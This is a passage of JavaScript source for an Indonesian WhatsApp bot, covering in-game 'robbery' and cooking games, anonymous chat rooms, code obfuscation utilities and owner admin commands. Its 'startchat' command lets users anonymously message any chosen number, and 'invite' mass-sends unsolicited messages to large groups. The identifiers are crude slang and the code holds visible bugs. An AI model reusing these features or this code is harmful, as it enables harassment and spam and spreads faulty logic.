let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangDomba(senderNumber, anu)
addDombaGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng domba ${i + 1}`)
}
setReply(`domba goreng anda saat ini ${getDombaGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
} else if (args[0] === 'sapi' && args[1]) {
if (getSapi(senderNumber) < 10) return setReply('Anda tidak memeliki cukup sapi')
let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangSapi(senderNumber, anu)
addSapiGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng sapi ${i + 1}`)
}
setReply(`sapi goreng anda saat ini ${getSapiGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
} else if (args[0] === 'gajah' && args[1]) {
if (getGajah(senderNumber) < 10) return setReply('Anda tidak memeliki cukup gajah')
let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangGajah(senderNumber, anu)
addGajahGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng gajah ${i + 1}`)
}
setReply(`gajah goreng anda saat ini ${getGajahGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
}
}
break
case 'tukar':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('tukar apa kak\n 1.ikan\n 2.ayam\n 3.kelinci\n 4.domba\n 5.sapi\n 6.gajah')
if (args[0] === 'ikan' && args[1]) {
if (getIkanGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ikan goreng')
kurangIkanGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getIkanGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
} else if (args[0] === 'ayam' && args[1]) {
if (getAyamGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ayam goreng')
kurangAyamGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getAyamGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
} else if (args[0] === 'kelinci' && args[1]) {
if (getKelinciGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ayam goreng')
kurangKelinciGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getKelinciGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
} else if (args[0] === 'domba' && args[1]) {
if (getDombaGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ayam goreng')
kurangDombaGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getDombaGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
} else if (args[0] === 'sapi' && args[1]) {
if (getSapiGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ayam goreng')
kurangSapiGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getSapiGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
} else if (args[0] === 'gajah' && args[1]) {
if (getGajahGoreng(senderNumber) < 1) return setReply('Anda tidak memeliki cukup ayam goreng')
kurangGajahGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getGajahGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`)
}
break
case 'nyopet':
case 'merampok':
case 'maling':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let memek = ['memek1','memek7','memek5','memek6','memek2','memek7','memek2','memek3','memek4','memek5','memek6','memek2','memek3','memek4','memek3','memek4','memek7','memek5','memek6','memek5','memek6','memek7']
let nyopet1 = [100, 150, 100, 200, 100, 250, 500, 100, 200, 300, 400, 500, 100, 350, 100, 200, 400, 600, 300, 100, 200, 450, 100, 200, 500, 100, 550, 300, 400, 100, 200, 600, 100, 650, 100, 200, 700, 300, 100, 750, 100, 200, 800, 100, 300, 850, 100, 200, 900, 100, 950, 400, 300, 100, 200, 1000]
let nyopet2 = [100, 300, 400, 100, 200, 200, 150, 150, 200, 250, 300, 100, 250, 150, 150, 800, 700, 650, 550, 500, 500, 400, 400, 350, 350, 900, 200, 300, 100, 100, 100, 400, 200, 200, 500, 100, 400, 800, 200, 700, 550, 650, 300, 350, 100, 150, 150, 400, 300, 250, 600, 400, 350, 200, 250, 1000]
let nyopet3 = [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1]
let rampok1 = pickRandom(nyopet1)
let rampok2 = pickRandom(nyopet2)
let rampok3 = pickRandom(nyopet3)
let memeknya = pickRandom(memek)
let randomidUser = pickRandom(user)
let noUsernya = randomidUser.id
if (memeknya === 'memek1') {
if (getBalance(noUsernya) < `${rampok1}`) return setReply('user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain')
if (getMonay(noUsernya) < `${rampok2}`) return setReply('user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain')
if (getLimit(noUsernya) < 1) return setReply('user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain')
kurangBalance(noUsernya, rampok1)
kurangMonay(noUsernya, rampok2)
kurangLimit(noUsernya, rampok3)
addBalance(senderNumber, rampok1)
addMonay(senderNumber, rampok2)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok monay\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek2') {
if (getBalance(noUsernya) < `${rampok1}`) return setReply('user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain')
if (getMonay(noUsernya) < `${rampok2}`) return setReply('user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain')
kurangBalance(noUsernya, rampok1)
kurangMonay(noUsernya, rampok2)
addBalance(senderNumber, rampok1)
addMonay(senderNumber, rampok2)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok monay\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek3') {
if (getMonay(noUsernya) < `${rampok2}`) return setReply('user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain')
if (getLimit(noUsernya) < 1) return setReply('user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain')
kurangMonay(noUsernya, rampok2)
kurangLimit(noUsernya, rampok3)
addMonay(senderNumber, rampok2)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok monay\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek4') {
if (getBalance(noUsernya) < `${rampok1}`) return setReply('user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain')
if (getLimit(noUsernya) < 1) return setReply('user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain')
kurangBalance(noUsernya, rampok1)
kurangLimit(noUsernya, rampok3)
addBalance(senderNumber, rampok1)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek5') {
if (getBalance(noUsernya) < `${rampok1}`) return setReply('user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain')
kurangBalance(noUsernya, rampok1)
addBalance(senderNumber, rampok1)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek6') {
if (getMonay(noUsernya) < `${rampok2}`) return setReply('user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain')
kurangMonay(noUsernya, rampok2)
addMonay(senderNumber, rampok2)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok monay\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek7') {
if (getLimit(noUsernya) < 1) return setReply('user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain')
kurangLimit(noUsernya, rampok3)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
}
}
break
//================================================================================\\
case 'anonymous':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Tidak bisa di gunakan di dalam group')
let teks = `
Anonymous Chat adalah
fitur yang memungkinkan kamu
berinteraksi dengan user lain
tanpa mengetahui identitas 
dan terintegrasi secara acak.

Klik start untuk memulai`
let mok = [
{ buttonId: `${prefix}start`, buttonText: { displayText: `START` }, type: 'RESPONSE' },
{ buttonId: `${prefix}keluar`, buttonText: { displayText: `KELUAR` }, type: 'RESPONSE' },
]
Araa.sendButLoc(from, teks, fake, fs.readFileSync('./media/image/anonymous.jpg'), mok)
}
break
case 'start':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (roomA || roomB) return setReply('Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu')
if (room) {
await Araa.sendMessage(room.a, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
room.b = m.sender
room.state = 'CHATTING'
room.expired = 'INFINITY'
await Araa.sendMessage(room.b, { text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan` })
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs('5m'),
}
anonChat.push(obj)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}
}
break
case 'startchat':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (!q) return setReply('Masukan nomer target yang mau di chat')
if (roomA || roomB) return setReply('Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu')
let id = +new Date()
const obj = {
id,
a: m.sender,
b: Input,
state: 'CHATTING',
expired: 'INFINITY',
}
anonChat.push(obj)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nSekarang kamu bisa mengirim pesan`)
}
break
case 'stop':
case 'keluar':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == 'CHATTING') {
await Araa.sendMessage(roomA.b, { text: 'Partnermu telah meninggalkan room anonymous' })
await setTimeout(() => {
setReply('Kamu telah keluar dari room anonymous')
roomA.a = roomA.b
roomA.b = ''
roomA.state = 'WAITING'
roomA.expired = Date.now() + toMs('5m')
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
}, 1000)
} else if (roomA && roomA.state == 'WAITING') {
setReply('Kamu telah keluar dari room anonymous')
anonChat.splice(anonChat.indexOf(roomA, 1))
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else if (roomB && roomB.state == 'CHATTING') {
await Araa.sendMessage(roomB.a, { text: `Partnermu telah meninggalkan room anonymous` })
setReply('Kamu telah keluar dari room anonymous dan meninggalkan partner mu')
roomB.b = ''
roomB.state = 'WAITING'
roomB.expired = Date.now() + toMs('5m')
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
}
break
case 'next':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == 'WAITING') {
setReply('Mencari Partner...')
anonChat.splice(roomA, 1)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
await setTimeout(async () => {
if (Object.values(anonChat).find((room) => room.state === 'WAITING' && room.b == '')) {
await Araa.sendMessage(room.a, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
room.b = m.sender
room.state = 'CHATTING'
room.expired = 'INFINITY'
await Araa.sendMessage(room.b, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs('5m'),
}
anonChat.push(obj)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000)
} else if (roomA && roomA.state == 'CHATTING') {
await Araa.sendMessage(roomA.b, { text: 'Partnermu telah mengeluarkanmu dari room Anonymous' })
setReply('Kamu telah mengeluarkan partnermu dari room anonymous ')
await setTimeout(() => {
setReply('Menunggu partner masuk ke dalam room')
roomA.b = ''
roomA.state = 'WAITING'
roomA.expired = Date.now() + toMs('5m')
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
}, 1000)
} else if (roomB) {
await Araa.sendMessage(roomB.a, { text: 'Partner telah meninggalkan room anonymous mu' })
setReply('Mohon tunggu sedang mencari room')
roomB.b = ''
roomB.state = 'WAITING'
roomB.expired = Date.now() + toMs('5m')
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
await setTimeout(async () => {
if (Object.values(anonChat).find((room) => room.state === 'WAITING' && room.b == '')) {
await Araa.sendMessage(room.a, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
room.b = m.sender
room.state = 'CHATTING'
room.expired = 'INFINITY'
await Araa.sendMessage(room.b, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs('5m'),
}
anonChat.push(obj)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000)
} else setReply('Kamu sedang tidak berada di dalam room anonymous')
}
break
case 'sendkontak':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == 'CHATTING') {
let profile = await Araa.profilePictureUrl(roomA.a)
let status = await Araa.fetchStatus(roomA.a)
let msg = await Araa.sendImage(roomA.b, profile, `Nama : ${await Araa.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split('@')[0]}`, m, { mentions: [roomA.a] })
Araa.sendContact(roomA.b, roomA.a.split('@')[0], await Araa.getName(roomA.a))
} else if (roomB && roomB.state == 'CHATTING') {
let profile = await Araa.profilePictureUrl(roomB.b)
let status = await Araa.fetchStatus(roomB.b)
let msg = await Araa.sendImage(roomB.a, profile, `Nama : ${await Araa.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split('@')[0]}`, m, { mentions: [roomB.b] })
Araa.sendContact(roomB.a, roomB.b.split('@')[0], await Araa.getName(roomB.b))
} else if (roomA == 'undefined' || roomB == 'undefined') {
setReply('Kamu sedang tidak berada di room anonymous')
} else setReply('Kamu belum dapat mengirim kontak karena kamu belum punya partner')
}
break
case 'invite':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) return setReply('Fitur tidak bisa di gunakan di dalam group')
if (!roomA) return setReply('Kamu sedang tidak berada di room anonymous')
if ((roomB && roomB.state == 'CHATTING') || (roomA && roomA.state == 'CHATTING')) return setReply('Kamu sudah berada di room anonymous dan sudah memulai sesi chat')
let getGroups = await Araa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let ana = groups.map((v) => v.id)
let mem = []
for (let i of ana) {
let data = await Araa.groupMetadata(i)
let obj = { id: data.id, total: data.participants.length }
await mem.push(obj)
}
let groupInvite = await mem.filter((member) => member.total > 50)
let yesnih = [{ buttonId: `${prefix}joinchat ${roomA.id}`, buttonText: { displayText: `ᴊᴏɪɴ ᴄʜᴀᴛ` }, type: 'RESPONSE' }]
let teks = `
Seseorang telah mengundang kamu 
untuk bergabung ke room anonymous chat
tekan tombol join chat di bawah ini untuk 
bergabung di room anonymous dan memulai 
sesi chat dengan user lain`
await Araa.sendMessage(from, { text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3} detik` })
for (let x of groupInvite) {
await sleep(3000)
await Araa.sendButLoc(x.id, teks, fake, fs.readFileSync('./media/image/anonymous.jpg'), yesnih)
}
await Araa.sendMessage(from, { text: `Undangan telah terkirim ke ${groupInvite.length} group` })
}
break
case 'joinchat':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan id room anonymous')
if (roomA && roomA.state == 'WAITING') return setReply('Kamu masih berada di room anonymous')
if ((roomB && roomB.state == 'CHATTING') || (roomA && roomA.state == 'CHATTING')) return setReply('Kamu sudah berada di room anonymous dan sudah memulai sesi chat')
let joinRoom = Object.values(anonChat).find((room) => room.id == q && room.state == 'WAITING')
if (joinRoom) {
await Araa.sendMessage(joinRoom.a, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
room.b = m.sender
room.state = 'CHATTING'
room.expired = 'INFINITY'
await Araa.sendMessage(joinRoom.b, { text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan` })
setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split('@')[0]}`)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else if (room) {
await Araa.sendMessage(room.a, { text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan` })
room.b = m.sender
room.state = 'CHATTING'
room.expired = 'INFINITY'
await Araa.sendMessage(room.b, { text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan` })
setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split('@')[0]}`)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs('5m'),
}
anonChat.push(obj)
global.setDatabase('anonymous.json', JSON.stringify(anonChat))
await Araa.sendMessage(sender, { text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner` })
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}
}
break
//================================================================================\\
case 'obfus':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
var JavaScriptObfuscator = require('javascript-obfuscator')
if (q) {
let obfuscationResult = JavaScriptObfuscator.obfuscate(q)
reply(obfuscationResult.getObfuscatedCode())
} else if (isQuotedTeks) {
let obfuscationResult = JavaScriptObfuscator.obfuscate(m.quoted.text)
reply(obfuscationResult.getObfuscatedCode())
} else setReply('Masukan code java script')
}
break
case 'deobfus':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
function beautifyJavaScript(source) {
const beautify = require('js-beautify').js_beautify
return beautify(source, { indent_size: 2 })
}
if (q) {
let teks = await beautifyJavaScript(q)
setReply(teks)
} else if (isQuotedTeks) {
let teks = await beautifyJavaScript(m.quoted.text)
setReply(teks)
} else setReply('Masukan code java script')
}
break
case 'packer':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
var UglifyJS = require('uglify-js')
if (q) {
let result = await UglifyJS.minify(q)
reply(result.code)
} else if (isQuotedTeks) {
console.log(isQuotedTeks)
let result = await UglifyJS.minify(m.quoted.text)
reply(result.code)
} else setReply('Masukan code java script atau reply file.js')
}
break
//================================================================================\\
case 'addowner':
try{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()  
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (owner.includes(Input)) return setReply("sudah menjadi owner kak")
owner.push(Input)
global.setDatabase('owner.json', JSON.stringify(owner))
setReply(`Succes add owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'addlimit':
case 'giftlimit':
case 'tambahLimit':
case 'kasihlimit':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)
if (mentionByReply) {
tambahLimit(mentionByReply.split('@')[0], parseInt(args[0]))
setReply(`Berhasil Add limit : ${args[0]}\nNo : ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
tambahLimit(mentionByTag[0].split('@')[0], parseInt(args[1]))
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${mentionByTag[0].split('@')[0]}`)
} else if (!mentionByReply && !mentionByTag[0]) {
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
tambahLimit(nomor + '@s.whatsapp.net', q.split("|")[1])
await setReply(`Berhasil Add limit : ${q.split("|")[1]}\nNo : ${nomor}️`)
} else setReply('Tag atau Reply usernya')
break
case 'addprem':
case 'addpremium':
try{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()  
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (premium.includes(Input)) return setReply("sudah menjadi premium kak")
premium.push(Input)
global.setDatabase('premiun.json', JSON.stringify(premium))
setReply(`Succes add premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'addsewa':
try{
if (!isOwner && !m.key.fromMe) return onlyOwner()  
if (isGroup && !q) {
if (sewa.includes(from)) return setReply("sudah sewa kak")
sewa.push(from)
global.setDatabase('sewa.json', JSON.stringify(sewa))
setReply(`Succes add sewa`)
} else if (!isGroup && q) {
if (sewa.includes(q)) return setReply("sudah sewa kak")
sewa.push(q)
global.setDatabase('sewa.json', JSON.stringify(sewa))
setReply(`Succes add sewa`)
}
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'givesaldo':
case 'addsaldo':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('Masukan angka')
if (mentionByReply) {
addBalance(mentionByReply.split('@')[0], parseInt(args[0]))
setReply(`Berhasil Add saldo : ${args[0]}\nNo : ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
addBalance(mentionByTag[0].split('@')[0], parseInt(args[1]))
await setReply(`Berhasil Add saldo : ${args[1]}\nNo : ${mentionByTag[0].split('@')[0]}`)
} else if (!mentionByReply && !mentionByTag[0]) {
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
addBalance(nomor + '@s.whatsapp.net', q.split("|")[1])
await setReply(`Berhasil Add saldo : ${q.split("|")[1]}\nNo : ${nomor}️`)
} else setReply('Tag atau Reply usernya')
break                                
case 'delowner':
try{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (!owner.includes(Input)) return setReply("tidak ada di database kak")
let deleteData = owner.indexOf(Input)
owner.splice(deleteData, 1)
global.setDatabase('owner.json', JSON.stringify(owner))
setReply(`Succes delete user owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'dellimit':
case 'hapuslimit':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)
if (mentionByReply) {
kurangLimit(mentionByReply.split('@')[0], parseInt(args[0]))
setReply(`Berhasil kurangi limit : ${args[0]}\nNo : ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
kurangLimit(mentionByTag[0].split('@')[0], parseInt(args[1]))
await setReply(`Berhasil kurangi limit : ${args[1]}\nNo : ${mentionByTag[0].split('@')[0]}`)
} else if (!mentionByReply && !mentionByTag[0]) {
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
kurangLimit(nomor + '@s.whatsapp.net', q.split("|")[1])
await setReply(`Berhasil kurangi limit : ${q.split("|")[1]}\nNo : ${nomor}️`)
} else setReply('Tag atau Reply usernya')
break
case 'delprem':
case 'delpremium':
try{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (!premium.includes(Input)) return setReply("tidak ada di database kak")
let deleteData = premium.indexOf(Input)
premium.splice(deleteData, 1)
global.setDatabase('premium.json', JSON.stringify(premium))
setReply(`Succes delete user premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delsewa':
try{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isGroup && !q) {
if (!sewa.includes(from)) return setReply("tidak ada di database kak")
let deleteData = sewa.indexOf(from)
sewa.splice(deleteData, 1)
